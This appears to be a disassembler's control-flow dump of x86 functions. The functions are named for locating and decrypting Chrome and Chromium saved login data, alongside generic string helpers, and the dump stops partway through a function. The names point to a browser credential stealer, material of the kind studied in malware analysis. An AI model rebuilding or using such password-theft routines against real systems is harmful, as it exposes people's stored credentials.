0x8051a3e:	push	ebx
0x8051a3f:	call	0x8052048
None
|
|
|
v
0x80519e5:	mov	edx, dword ptr [esp + 0x4c]
0x80519e9:	mov	dword ptr [esp + 0x38], edx
0x80519ed:	add	esp, 0x20
0x80519f0:	test	al, 1
0x80519f2:	lea	ebx, dword ptr [eax - 0xc]
0x80519f5:	je	0x80519fa
None
|
|
|
v
0x80519bf:	add	edi, dword ptr [esp + 0x3c]
0x80519c3:	mov	dword ptr [esp + 0x2c], eax
0x80519c7:	push	esi
0x80519c8:	push	edi
0x80519c9:	call	0x805175a
None
|
|
|
v
0x8051a27:	add	esp, 0x10
0x8051a2a:	test	al, 1
0x8051a2c:	jne	0x8051a33
None
|
|
|
v
0x80519f7:	lea	ebx, dword ptr [eax - 0xd]
0x80519fa:	shr	ebx, 1
0x80519fc:	push	eax
0x80519fd:	push	ebx
0x80519fe:	push	dword ptr [esp + 0x64]
0x8051a02:	push	dword ptr [esp + 0x18]
0x8051a06:	call	0x8052048
None
|
|
|
v
0x8051a60:	or	eax, 0xffffffff
0x8051a63:	add	esp, 0x3c
0x8051a66:	pop	ebx
0x8051a67:	pop	esi
0x8051a68:	pop	edi
0x8051a69:	pop	ebp
0x8051a6a:	ret	
None
|
|
|
v
0x80519b0:	add	edi, dword ptr [esp + 0x34]
0x80519b4:	mov	dword ptr [esp + 0x1c], eax
0x80519b8:	push	esi
0x80519b9:	push	edi
0x80519ba:	call	0x805175a
None
|
|
|
v
0x8051a63:	add	esp, 0x3c
0x8051a66:	pop	ebx
0x8051a67:	pop	esi
0x8051a68:	pop	edi
0x8051a69:	pop	ebp
0x8051a6a:	ret	
None
|
|
|
v
0x8051a12:	add	ebx, dword ptr [esp + 0xc]
0x8051a16:	push	ecx
0x8051a17:	push	ecx
0x8051a18:	push	esi
0x8051a19:	mov	eax, dword ptr [esp + 0x1c]
0x8051a1d:	add	eax, dword ptr [esp + 0x24]
0x8051a21:	push	eax
0x8051a22:	call	0x805175a
None
|
|
|
v
0x8051a56:	cmp	ebp, dword ptr [esp + 0x54]
0x8051a5a:	jle	0x80519a9
None
|
|
|
v
0x80519ce:	add	eax, edi
0x80519d0:	mov	dword ptr [esp + 0x24], eax
0x80519d4:	mov	eax, dword ptr [esp + 0x44]
0x80519d8:	add	eax, edi
0x80519da:	mov	dword ptr [esp + 0x28], eax
0x80519de:	push	esi
0x80519df:	push	eax
0x80519e0:	call	0x805175a
None
|
|
|
v
0x8051a4b:	mov	eax, dword ptr [esp + 0x1c]
0x8051a4f:	jmp	0x8051a63
None
|
|
|
v
0x80519a9:	push	esi
0x80519aa:	push	edi
0x80519ab:	call	0x805175a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:GetLoginDataPath
TOTAL BLOCKS :10
0x8051a7f:	cmp	eax, 5
0x8051a82:	jne	0x8051ac0
None
|
|
|
v
0x8051aaa:	pop	edx
0x8051aab:	pop	ecx
0x8051aac:	push	eax
0x8051aad:	push	0x805640b
0x8051ab2:	push	-1
0x8051ab4:	push	1
0x8051ab6:	push	esi
0x8051ab7:	push	ebx
0x8051ab8:	call	0x804bb70
None
|
|
|
v
0x8051ac0:	mov	dword ptr [esp + 0x10], ebx
0x8051ac4:	pop	eax
0x8051ac5:	pop	ebx
0x8051ac6:	pop	esi
0x8051ac7:	jmp	0x804f12a
None
|
|
|
v
0x8051a6b:	push	esi
0x8051a6c:	push	ebx
0x8051a6d:	push	ebx
0x8051a6e:	mov	eax, dword ptr [esp + 0x10]
0x8051a72:	mov	ebx, dword ptr [esp + 0x14]
0x8051a76:	mov	esi, dword ptr [esp + 0x18]
0x8051a7a:	cmp	eax, 4
0x8051a7d:	je	0x8051a86
None
|
|
|
v
0x8051a9d:	sub	esp, 0xc
0x8051aa0:	push	0x80561e9
0x8051aa5:	call	0x804bd10
None
|
|
|
v
0x8051a86:	sub	esp, 0xc
0x8051a89:	push	0x80561e9
0x8051a8e:	call	0x804bd10
None
|
|
|
v
0x8051a84:	jmp	0x8051a9d
None
|
|
|
v
0x8051a93:	pop	edx
0x8051a94:	pop	ecx
0x8051a95:	push	eax
0x8051a96:	push	0x80563df
0x8051a9b:	jmp	0x8051ab2
None
|
|
|
v
0x8051abd:	add	esp, 0x20
0x8051ac0:	mov	dword ptr [esp + 0x10], ebx
0x8051ac4:	pop	eax
0x8051ac5:	pop	ebx
0x8051ac6:	pop	esi
0x8051ac7:	jmp	0x804f12a
None
|
|
|
v
0x8051ab2:	push	-1
0x8051ab4:	push	1
0x8051ab6:	push	esi
0x8051ab7:	push	ebx
0x8051ab8:	call	0x804bb70
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:DecryptLoginData
TOTAL BLOCKS :22
0x8051c60:	mov	eax, dword ptr [esp + 0x30]
0x8051c64:	add	esp, 0x10
0x8051c67:	add	esp, 0x3c
0x8051c6a:	pop	ebx
0x8051c6b:	pop	esi
0x8051c6c:	pop	edi
0x8051c6d:	pop	ebp
0x8051c6e:	ret	
None
|
|
|
v
0x8051c37:	add	ebx, dword ptr [esp + 0x48]
0x8051c3b:	mov	dword ptr [esp + 0x40], eax
0x8051c3f:	mov	eax, dword ptr [esp + 0x2c]
0x8051c43:	add	dword ptr [esp + 0x38], eax
0x8051c47:	add	esp, 0x20
0x8051c4a:	test	si, si
0x8051c4d:	jne	0x8051bcb
None
|
|
|
v
0x8051c53:	sub	esp, 0xc
0x8051c56:	lea	eax, dword ptr [esp + 0x20]
0x8051c5a:	push	eax
0x8051c5b:	call	0x804f57c
None
|
|
|
v
0x8051bf9:	mov	eax, dword ptr [esp + 0x28]
0x8051bfd:	add	eax, dword ptr [esp + 0x3c]
0x8051c01:	mov	dword ptr [esp + 0x28], eax
0x8051c05:	add	esp, 0xc
0x8051c08:	push	ebp
0x8051c09:	push	eax
0x8051c0a:	push	dword ptr [esp + 0x5c]
0x8051c0e:	call	0x80517af
None
|
|
|
v
0x8051acc:	push	ebp
0x8051acd:	push	edi
0x8051ace:	push	esi
0x8051acf:	push	ebx
0x8051ad0:	sub	esp, 0x44
0x8051ad3:	push	0
0x8051ad5:	push	dword ptr [esp + 0x60]
0x8051ad9:	call	0x804f5a1
None
|
|
|
v
0x8051b05:	mov	ebx, eax
0x8051b07:	mov	eax, dword ptr [esp + 0x24]
0x8051b0b:	lea	edx, dword ptr [eax + 0x64]
0x8051b0e:	mov	dword ptr [esp + 0x2c], edx
0x8051b12:	add	esp, 0x10
0x8051b15:	cmp	byte ptr [eax + 0x64], 0xd
0x8051b19:	jne	0x8051c53
None
|
|
|
v
0x8051bcb:	mov	dword ptr [esp + 0x2c], 0
0x8051bd3:	dec	esi
0x8051bd4:	push	eax
0x8051bd5:	push	eax
0x8051bd6:	push	edi
0x8051bd7:	push	dword ptr [esp + 0x24]
0x8051bdb:	call	0x805175a
None
|
|
|
v
0x8051b33:	mov	dword ptr [esp], esi
0x8051b36:	mov	ebp, eax
0x8051b38:	call	0x8051795
None
|
|
|
v
0x8051be0:	mov	dword ptr [esp + 0x1c], eax
0x8051be4:	mov	eax, dword ptr [esp + 0x28]
0x8051be8:	add	eax, dword ptr [esp + 0x3c]
0x8051bec:	mov	dword ptr [esp + 0x28], eax
0x8051bf0:	pop	edx
0x8051bf1:	pop	ecx
0x8051bf2:	push	edi
0x8051bf3:	push	eax
0x8051bf4:	call	0x805175a
None
|
|
|
v
0x8051c67:	add	esp, 0x3c
0x8051c6a:	pop	ebx
0x8051c6b:	pop	esi
0x8051c6c:	pop	edi
0x8051c6d:	pop	ebp
0x8051c6e:	ret	
None
|
|
|
v
0x8051c13:	mov	dword ptr [esp + 0x34], eax
0x8051c17:	add	esp, 0x10
0x8051c1a:	test	eax, eax
0x8051c1c:	je	0x8051c53
None
|
|
|
v
0x8051b64:	movzx	ebx, bx
0x8051b67:	imul	ebx, eax
0x8051b6a:	mov	eax, dword ptr [esp + 0x14]
0x8051b6e:	add	eax, ebx
0x8051b70:	mov	dword ptr [esp + 0x18], eax
0x8051b74:	cmp	byte ptr [eax], 0xd
0x8051b77:	jne	0x8051c53
None
|
|
|
v
0x8051b58:	add	esp, 0x20
0x8051b5b:	cmp	eax, 0xff
0x8051b5e:	je	0x8051c53
None
|
|
|
v
0x8051b7d:	add	eax, 3
0x8051b80:	mov	dword ptr [esp + 0x18], eax
0x8051b84:	sub	esp, 0xc
0x8051b87:	push	edi
0x8051b88:	call	0x8051795
None
|
|
|
v
0x8051b3d:	movzx	ebp, bp
0x8051b40:	push	0x8056432
0x8051b45:	push	0x805637b
0x8051b4a:	push	ebp
0x8051b4b:	movzx	eax, ax
0x8051b4e:	add	eax, dword ptr [esp + 0x30]
0x8051b52:	push	eax
0x8051b53:	call	0x8051988
None
|
|
|
v
0x8051ade:	mov	edx, eax
0x8051ae0:	mov	dword ptr [esp + 0x24], eax
0x8051ae4:	add	esp, 0x10
0x8051ae7:	xor	eax, eax
0x8051ae9:	test	edx, edx
0x8051aeb:	je	0x8051c67
None
|
|
|
v
0x8051c1e:	sub	esp, 0xc
0x8051c21:	push	1
0x8051c23:	push	dword ptr [esp + 0x38]
0x8051c27:	lea	eax, dword ptr [esp + 0x38]
0x8051c2b:	push	eax
0x8051c2c:	push	ebx
0x8051c2d:	lea	eax, dword ptr [esp + 0x3c]
0x8051c31:	push	eax
0x8051c32:	call	0x8051f2f
None
|
|
|
v
0x8051b8d:	mov	dword ptr [esp], edi
0x8051b90:	mov	esi, eax
0x8051b92:	call	0x8051795
None
|
|
|
v
0x8051af1:	add	edx, 0x10
0x8051af4:	mov	dword ptr [esp + 0x18], edx
0x8051af8:	sub	esp, 0xc
0x8051afb:	lea	edi, dword ptr [esp + 0x24]
0x8051aff:	push	edi
0x8051b00:	call	0x8051795
None
|
|
|
v
0x8051b97:	mov	dword ptr [esp + 0x30], 0
0x8051b9f:	mov	dword ptr [esp + 0x34], 0
0x8051ba7:	mov	dword ptr [esp + 0x38], 0
0x8051baf:	movzx	eax, ax
0x8051bb2:	add	ebx, eax
0x8051bb4:	add	ebx, dword ptr [esp + 0x24]
0x8051bb8:	mov	dword ptr [esp + 0x28], ebx
0x8051bbc:	add	esp, 0x10
0x8051bbf:	xor	ebx, ebx
0x8051bc1:	lea	edi, dword ptr [esp + 0x2c]
0x8051bc5:	lea	ebp, dword ptr [esp + 0x28]
0x8051bc9:	jmp	0x8051c4a
None
|
|
|
v
0x8051b1f:	add	eax, 0x67
0x8051b22:	mov	dword ptr [esp + 0x1c], eax
0x8051b26:	sub	esp, 0xc
0x8051b29:	lea	esi, dword ptr [esp + 0x28]
0x8051b2d:	push	esi
0x8051b2e:	call	0x8051795
None
|
|
|
v
0x8051c4a:	test	si, si
0x8051c4d:	jne	0x8051bcb
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:GetGoogleChromePasswords
TOTAL BLOCKS :5
0x8051c87:	add	esp, 0x10
0x8051c8a:	mov	dl, al
0x8051c8c:	xor	eax, eax
0x8051c8e:	test	dl, dl
0x8051c90:	je	0x8051c9f
None
|
|
|
v
0x8051c9f:	add	esp, 0x1108
0x8051ca5:	pop	ebx
0x8051ca6:	ret	
None
|
|
|
v
0x8051c6f:	push	ebx
0x8051c70:	sub	esp, 0x110c
0x8051c76:	push	0x1100
0x8051c7b:	lea	ebx, dword ptr [esp + 8]
0x8051c7f:	push	ebx
0x8051c80:	push	4
0x8051c82:	call	0x8051a6b
None
|
|
|
v
0x8051c9c:	add	esp, 0x10
0x8051c9f:	add	esp, 0x1108
0x8051ca5:	pop	ebx
0x8051ca6:	ret	
None
|
|
|
v
0x8051c92:	push	eax
0x8051c93:	push	eax
0x8051c94:	push	ebx
0x8051c95:	push	4
0x8051c97:	call	0x8051acc
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:GetChromiumPasswords
TOTAL BLOCKS :5
0x8051cd7:	add	esp, 0x1108
0x8051cdd:	pop	ebx
0x8051cde:	ret	
None
|
|
|
v
0x8051cbf:	add	esp, 0x10
0x8051cc2:	mov	dl, al
0x8051cc4:	xor	eax, eax
0x8051cc6:	test	dl, dl
0x8051cc8:	je	0x8051cd7
None
|
|
|
v
0x8051ca7:	push	ebx
0x8051ca8:	sub	esp, 0x110c
0x8051cae:	push	0x1100
0x8051cb3:	lea	ebx, dword ptr [esp + 8]
0x8051cb7:	push	ebx
0x8051cb8:	push	5
0x8051cba:	call	0x8051a6b
None
|
|
|
v
0x8051cd4:	add	esp, 0x10
0x8051cd7:	add	esp, 0x1108
0x8051cdd:	pop	ebx
0x8051cde:	ret	
None
|
|
|
v
0x8051cca:	push	eax
0x8051ccb:	push	eax
0x8051ccc:	push	ebx
0x8051ccd:	push	5
0x8051ccf:	call	0x8051acc
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:StrCopy
TOTAL BLOCKS :10
0x8051cf1:	jmp	0x8051d08
None
|
|
|
v
0x8051cff:	mov	edx, dword ptr [esp + 0x10]
0x8051d03:	dec	ebx
0x8051d04:	jne	0x8051cf3
None
|
|
|
v
0x8051d16:	mov	byte ptr [edx], 0
0x8051d19:	jmp	0x8051d08
None
|
|
|
v
0x8051ce0:	push	esi
0x8051ce1:	push	ebx
0x8051ce2:	push	ecx
0x8051ce3:	mov	ebx, dword ptr [esp + 0x18]
0x8051ce7:	mov	esi, dword ptr [esp + 0x14]
0x8051ceb:	test	ebx, ebx
0x8051ced:	mov	eax, esi
0x8051cef:	jne	0x8051cff
None
|
|
|
v
0x8051d06:	jmp	0x8051d16
None
|
|
|
v
0x8051cfd:	jmp	0x8051d0f
None
|
|
|
v
0x8051d0f:	sub	eax, esi
0x8051d11:	pop	edx
0x8051d12:	dec	eax
0x8051d13:	pop	ebx
0x8051d14:	pop	esi
0x8051d15:	ret	
None
|
|
|
v
0x8051d08:	mov	dl, byte ptr [eax]
0x8051d0a:	inc	eax
0x8051d0b:	test	dl, dl
0x8051d0d:	jne	0x8051d08
None
|
|
|
v
0x8051cf3:	mov	cl, byte ptr [eax]
0x8051cf5:	inc	eax
0x8051cf6:	mov	byte ptr [edx], cl
0x8051cf8:	inc	edx
0x8051cf9:	test	cl, cl
0x8051cfb:	jne	0x8051d03
None
|
|
|
v
0x8051d03:	dec	ebx
0x8051d04:	jne	0x8051cf3
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:StrConcatenate
TOTAL BLOCKS :15
0x8051d53:	not	ecx
0x8051d55:	lea	eax, dword ptr [edx + ecx - 1]
0x8051d59:	jmp	0x8051d7a
None
|
|
|
v
0x8051d31:	inc	ecx
0x8051d32:	test	eax, eax
0x8051d34:	je	0x8051d3c
None
|
|
|
v
0x8051d4c:	xor	eax, eax
0x8051d4e:	or	ecx, 0xffffffff
0x8051d51:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8051d5b:	cmp	esi, 1
0x8051d5e:	je	0x8051d68
None
|
|
|
v
0x8051d32:	test	eax, eax
0x8051d34:	je	0x8051d3c
None
|
|
|
v
0x8051d60:	mov	bl, byte ptr [esp + 3]
0x8051d64:	dec	esi
0x8051d65:	mov	byte ptr [ecx], bl
0x8051d67:	inc	ecx
0x8051d68:	inc	eax
0x8051d69:	mov	bl, byte ptr [eax]
0x8051d6b:	test	bl, bl
0x8051d6d:	mov	byte ptr [esp + 3], bl
0x8051d71:	jne	0x8051d5b
None
|
|
|
v
0x8051d51:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8051d69:	mov	bl, byte ptr [eax]
0x8051d6b:	test	bl, bl
0x8051d6d:	mov	byte ptr [esp + 3], bl
0x8051d71:	jne	0x8051d5b
None
|
|
|
v
0x8051d7a:	pop	ebx
0x8051d7b:	pop	ebx
0x8051d7c:	pop	esi
0x8051d7d:	pop	edi
0x8051d7e:	ret	
None
|
|
|
v
0x8051d73:	sub	eax, edi
0x8051d75:	mov	byte ptr [ecx], 0
0x8051d78:	add	eax, edx
0x8051d7a:	pop	ebx
0x8051d7b:	pop	ebx
0x8051d7c:	pop	esi
0x8051d7d:	pop	edi
0x8051d7e:	ret	
None
|
|
|
v
0x8051d36:	dec	eax
0x8051d37:	cmp	byte ptr [ecx], 0
0x8051d3a:	jne	0x8051d31
None
|
|
|
v
0x8051d3c:	mov	eax, ecx
0x8051d3e:	mov	esi, ebx
0x8051d40:	sub	eax, edx
0x8051d42:	sub	esi, eax
0x8051d44:	mov	edx, eax
0x8051d46:	je	0x8051d4c
None
|
|
|
v
0x8051d68:	inc	eax
0x8051d69:	mov	bl, byte ptr [eax]
0x8051d6b:	test	bl, bl
0x8051d6d:	mov	byte ptr [esp + 3], bl
0x8051d71:	jne	0x8051d5b
None
|
|
|
v
0x8051d1b:	push	edi
0x8051d1c:	push	esi
0x8051d1d:	push	ebx
0x8051d1e:	push	esi
0x8051d1f:	mov	edx, dword ptr [esp + 0x14]
0x8051d23:	mov	ebx, dword ptr [esp + 0x1c]
0x8051d27:	mov	edi, dword ptr [esp + 0x18]
0x8051d2b:	mov	ecx, edx
0x8051d2d:	mov	eax, ebx
0x8051d2f:	jmp	0x8051d32
None
|
|
|
v
0x8051d48:	mov	eax, edi
0x8051d4a:	jmp	0x8051d69
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:StrPosition
TOTAL BLOCKS :15
0x8051d99:	mov	edx, 1
0x8051d9e:	lea	esi, dword ptr [ecx + eax]
0x8051da1:	jmp	0x8051da4
None
|
|
|
v
0x8051dd1:	pop	edi
0x8051dd2:	pop	ebx
0x8051dd3:	pop	esi
0x8051dd4:	pop	edi
0x8051dd5:	ret	
None
|
|
|
v
0x8051da3:	inc	edx
0x8051da4:	mov	bl, byte ptr [edi + edx]
0x8051da7:	test	bl, bl
0x8051da9:	mov	byte ptr [esp + 2], bl
0x8051dad:	je	0x8051dd1
None
|
|
|
v
0x8051dc6:	inc	eax
0x8051dc7:	mov	dl, byte ptr [ecx + eax]
0x8051dca:	test	dl, dl
0x8051dcc:	jne	0x8051d95
None
|
|
|
v
0x8051dde:	jmp	0x8051dce
None
|
|
|
v
0x8051d95:	cmp	dl, byte ptr [edi]
0x8051d97:	jne	0x8051dc6
None
|
|
|
v
0x8051dc7:	mov	dl, byte ptr [ecx + eax]
0x8051dca:	test	dl, dl
0x8051dcc:	jne	0x8051d95
None
|
|
|
v
0x8051daf:	mov	bl, byte ptr [esi + edx]
0x8051db2:	test	bl, bl
0x8051db4:	mov	byte ptr [esp + 3], bl
0x8051db8:	je	0x8051dd6
None
|
|
|
v
0x8051d93:	jmp	0x8051dce
None
|
|
|
v
0x8051dd6:	add	edx, ecx
0x8051dd8:	cmp	byte ptr [edx + eax], 0
0x8051ddc:	jne	0x8051dc6
None
|
|
|
v
0x8051dba:	mov	bl, byte ptr [esp + 2]
0x8051dbe:	cmp	byte ptr [esp + 3], bl
0x8051dc2:	je	0x8051da3
None
|
|
|
v
0x8051d7f:	push	edi
0x8051d80:	push	esi
0x8051d81:	push	ebx
0x8051d82:	push	eax
0x8051d83:	mov	ecx, dword ptr [esp + 0x1c]
0x8051d87:	mov	eax, dword ptr [esp + 0x14]
0x8051d8b:	mov	edi, dword ptr [esp + 0x18]
0x8051d8f:	test	ecx, ecx
0x8051d91:	jne	0x8051dc7
None
|
|
|
v
0x8051dc4:	jmp	0x8051dd6
None
|
|
|
v
0x8051dce:	or	eax, 0xffffffff
0x8051dd1:	pop	edi
0x8051dd2:	pop	ebx
0x8051dd3:	pop	esi
0x8051dd4:	pop	edi
0x8051dd5:	ret	
None
|
|
|
v
0x8051da4:	mov	bl, byte ptr [edi + edx]
0x8051da7:	test	bl, bl
0x8051da9:	mov	byte ptr [esp + 2], bl
0x8051dad:	je	0x8051dd1
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:StrToInt
TOTAL BLOCKS :8
0x8051e2a:	imul	eax, ebp
0x8051e2d:	pop	ebx
0x8051e2e:	pop	esi
0x8051e2f:	pop	edi
0x8051e30:	pop	ebp
0x8051e31:	ret	
None
|
|
|
v
0x8051e25:	cmp	edx, 0xa
0x8051e28:	jle	0x8051e04
None
|
|
|
v
0x8051e04:	lea	edi, dword ptr [esi - 0x30]
0x8051e07:	mov	ebx, edi
0x8051e09:	cmp	bl, 9
0x8051e0c:	ja	0x8051e2a
None
|
|
|
v
0x8051de0:	push	ebp
0x8051de1:	xor	eax, eax
0x8051de3:	push	edi
0x8051de4:	push	esi
0x8051de5:	push	ebx
0x8051de6:	mov	ecx, dword ptr [esp + 0x14]
0x8051dea:	test	ecx, ecx
0x8051dec:	je	0x8051e2d
None
|
|
|
v
0x8051e2d:	pop	ebx
0x8051e2e:	pop	esi
0x8051e2f:	pop	edi
0x8051e30:	pop	ebp
0x8051e31:	ret	
None
|
|
|
v
0x8051e1b:	movzx	esi, byte ptr [ecx + edx]
0x8051e1f:	mov	ebx, esi
0x8051e21:	test	bl, bl
0x8051e23:	je	0x8051e2a
None
|
|
|
v
0x8051e0e:	imul	ebp, ebp, 0xa
0x8051e11:	mov	ebx, esi
0x8051e13:	movsx	esi, bl
0x8051e16:	inc	edx
0x8051e17:	lea	ebp, dword ptr [ebp + esi - 0x30]
0x8051e1b:	movzx	esi, byte ptr [ecx + edx]
0x8051e1f:	mov	ebx, esi
0x8051e21:	test	bl, bl
0x8051e23:	je	0x8051e2a
None
|
|
|
v
0x8051dee:	xor	eax, eax
0x8051df0:	cmp	byte ptr [ecx], 0x2d
0x8051df3:	setne	al
0x8051df6:	sete	dl
0x8051df9:	lea	eax, dword ptr [eax + eax - 1]
0x8051dfd:	movzx	edx, dl
0x8051e00:	xor	ebp, ebp
0x8051e02:	jmp	0x8051e1b
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:StrToInt64
TOTAL BLOCKS :8
0x8051e32:	push	ebp
0x8051e33:	xor	eax, eax
0x8051e35:	push	edi
0x8051e36:	xor	edx, edx
0x8051e38:	push	esi
0x8051e39:	push	ebx
0x8051e3a:	sub	esp, 0x1c
0x8051e3d:	mov	edi, dword ptr [esp + 0x30]
0x8051e41:	test	edi, edi
0x8051e43:	je	0x8051ee5
None
|
|
|
v
0x8051ec4:	mov	ecx, dword ptr [esp + 4]
0x8051ec8:	mov	edx, dword ptr [esp + 0xc]
0x8051ecc:	mov	eax, dword ptr [esp + 8]
0x8051ed0:	mov	edi, ecx
0x8051ed2:	sar	edi, 0x1f
0x8051ed5:	mov	ebx, edx
0x8051ed7:	mov	edx, edi
0x8051ed9:	imul	edx, eax
0x8051edc:	imul	ebx, ecx
0x8051edf:	add	ebx, edx
0x8051ee1:	mul	ecx
0x8051ee3:	add	edx, ebx
0x8051ee5:	add	esp, 0x1c
0x8051ee8:	pop	ebx
0x8051ee9:	pop	esi
0x8051eea:	pop	edi
0x8051eeb:	pop	ebp
0x8051eec:	ret	
None
|
|
|
v
0x8051eb8:	mov	bl, byte ptr [edi + esi]
0x8051ebb:	test	bl, bl
0x8051ebd:	je	0x8051ec4
None
|
|
|
v
0x8051ebf:	cmp	esi, 0x14
0x8051ec2:	jle	0x8051e6f
None
|
|
|
v
0x8051e79:	imul	ebp, dword ptr [esp + 0xc], 0xa
0x8051e7e:	mov	eax, 0xa
0x8051e83:	mul	dword ptr [esp + 8]
0x8051e87:	add	edx, ebp
0x8051e89:	mov	dword ptr [esp + 0x10], eax
0x8051e8d:	movsx	eax, bl
0x8051e90:	mov	dword ptr [esp + 8], eax
0x8051e94:	mov	dword ptr [esp + 0x14], edx
0x8051e98:	cdq	
0x8051e99:	mov	eax, dword ptr [esp + 0x10]
0x8051e9d:	mov	dword ptr [esp + 0xc], edx
0x8051ea1:	mov	edx, dword ptr [esp + 0x14]
0x8051ea5:	add	dword ptr [esp + 8], eax
0x8051ea9:	adc	dword ptr [esp + 0xc], edx
0x8051ead:	add	dword ptr [esp + 8], -0x30
0x8051eb2:	adc	dword ptr [esp + 0xc], -1
0x8051eb7:	inc	esi
0x8051eb8:	mov	bl, byte ptr [edi + esi]
0x8051ebb:	test	bl, bl
0x8051ebd:	je	0x8051ec4
None
|
|
|
v
0x8051e6f:	lea	ebp, dword ptr [ebx - 0x30]
0x8051e72:	mov	edx, ebp
0x8051e74:	cmp	dl, 9
0x8051e77:	ja	0x8051ec4
None
|
|
|
v
0x8051e49:	xor	ecx, ecx
0x8051e4b:	cmp	byte ptr [edi], 0x2d
0x8051e4e:	sete	al
0x8051e51:	setne	cl
0x8051e54:	movzx	eax, al
0x8051e57:	xor	edx, edx
0x8051e59:	lea	ecx, dword ptr [ecx + ecx - 1]
0x8051e5d:	mov	esi, eax
0x8051e5f:	xor	eax, eax
0x8051e61:	mov	dword ptr [esp + 8], eax
0x8051e65:	mov	dword ptr [esp + 0xc], edx
0x8051e69:	mov	dword ptr [esp + 4], ecx
0x8051e6d:	jmp	0x8051eb8
None
|
|
|
v
0x8051ee5:	add	esp, 0x1c
0x8051ee8:	pop	ebx
0x8051ee9:	pop	esi
0x8051eea:	pop	edi
0x8051eeb:	pop	ebp
0x8051eec:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:StrTrim
TOTAL BLOCKS :14
0x8051efd:	mov	bl, byte ptr [ecx]
0x8051eff:	test	bl, bl
0x8051f01:	je	0x8051f08
None
|
|
|
v
0x8051f10:	mov	byte ptr [edx], 0x20
0x8051f13:	inc	edx
0x8051f14:	jmp	0x8051f1a
None
|
|
|
v
0x8051f2a:	mov	byte ptr [edx], 0
0x8051f2d:	pop	ebx
0x8051f2e:	ret	
None
|
|
|
v
0x8051f1a:	mov	bl, byte ptr [ecx]
0x8051f1c:	test	bl, bl
0x8051f1e:	je	0x8051f25
None
|
|
|
v
0x8051f2d:	pop	ebx
0x8051f2e:	ret	
None
|
|
|
v
0x8051f25:	cmp	byte ptr [ecx], 0
0x8051f28:	jne	0x8051efd
None
|
|
|
v
0x8051f0c:	cmp	edx, eax
0x8051f0e:	je	0x8051f1a
None
|
|
|
v
0x8051f20:	cmp	bl, 0x20
0x8051f23:	jne	0x8051f16
None
|
|
|
v
0x8051ef6:	mov	edx, eax
0x8051ef8:	mov	ecx, eax
0x8051efa:	jmp	0x8051f25
None
|
|
|
v
0x8051eed:	push	ebx
0x8051eee:	mov	eax, dword ptr [esp + 8]
0x8051ef2:	test	eax, eax
0x8051ef4:	je	0x8051f2d
None
|
|
|
v
0x8051efc:	inc	ecx
0x8051efd:	mov	bl, byte ptr [ecx]
0x8051eff:	test	bl, bl
0x8051f01:	je	0x8051f08
None
|
|
|
v
0x8051f08:	test	bl, bl
0x8051f0a:	je	0x8051f1a
None
|
|
|
v
0x8051f16:	mov	byte ptr [edx], bl
0x8051f18:	inc	ecx
0x8051f19:	inc	edx
0x8051f1a:	mov	bl, byte ptr [ecx]
0x8051f1c:	test	bl, bl
0x8051f1e:	je	0x8051f25
None
|
|
|
v
0x8051f03:	cmp	bl, 0x20
0x8051f06:	je	0x8051efc
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:aStrConcatenate
TOTAL BLOCKS :31
0x8051fd9:	cmp	byte ptr [esp + 0xb], 0
0x8051fde:	je	0x8051fec
None
|
|
|
v
0x8051fe9:	add	esp, 0x10
0x8051fec:	mov	eax, dword ptr [esp + 0x30]
0x8051ff0:	mov	ebx, dword ptr [eax]
0x8051ff2:	jmp	0x805203e
None
|
|
|
v
0x805200b:	lea	eax, dword ptr [eax + esi]
0x805200e:	mov	ecx, dword ptr [esp + 0x3c]
0x8052012:	mov	esi, dword ptr [ebp]
0x8052015:	mov	edi, eax
0x8052017:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x8051fc6:	mov	ebx, dword ptr [ebp]
0x8051fc9:	jmp	0x805203e
None
|
|
|
v
0x8051fcb:	cmp	dword ptr [esp + 0x3c], 0
0x8051fd0:	jg	0x8051ff4
None
|
|
|
v
0x8051f93:	mov	eax, dword ptr [esp + 0x3c]
0x8051f97:	xor	ebx, ebx
0x8051f99:	add	eax, esi
0x8051f9b:	mov	dword ptr [esp + 0xc], eax
0x8051f9f:	js	0x805203e
None
|
|
|
v
0x8052002:	add	esp, 0x10
0x8052005:	test	eax, eax
0x8052007:	mov	ebx, eax
0x8052009:	je	0x805203e
None
|
|
|
v
0x8052017:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x8051fd2:	cmp	byte ptr [esp + 9], 0
0x8051fd7:	je	0x8051fec
None
|
|
|
v
0x8051f66:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8051f2f:	push	ebp
0x8051f30:	push	edi
0x8051f31:	push	esi
0x8051f32:	push	ebx
0x8051f33:	sub	esp, 0x1c
0x8051f36:	mov	al, byte ptr [esp + 0x40]
0x8051f3a:	mov	esi, dword ptr [esp + 0x34]
0x8051f3e:	mov	ebp, dword ptr [esp + 0x38]
0x8051f42:	mov	byte ptr [esp + 9], al
0x8051f46:	mov	eax, dword ptr [esp + 0x30]
0x8051f4a:	mov	edx, dword ptr [eax]
0x8051f4c:	test	edx, edx
0x8051f4e:	setne	byte ptr [esp + 0xa]
0x8051f53:	cmp	esi, 0xff
0x8051f56:	jne	0x8051f6d
None
|
|
|
v
0x8051fb7:	sub	esp, 0xc
0x8051fba:	push	dword ptr [esp + 0x3c]
0x8051fbe:	call	0x804f57c
None
|
|
|
v
0x8051fec:	mov	eax, dword ptr [esp + 0x30]
0x8051ff0:	mov	ebx, dword ptr [eax]
0x8051ff2:	jmp	0x805203e
None
|
|
|
v
0x8051ff4:	push	eax
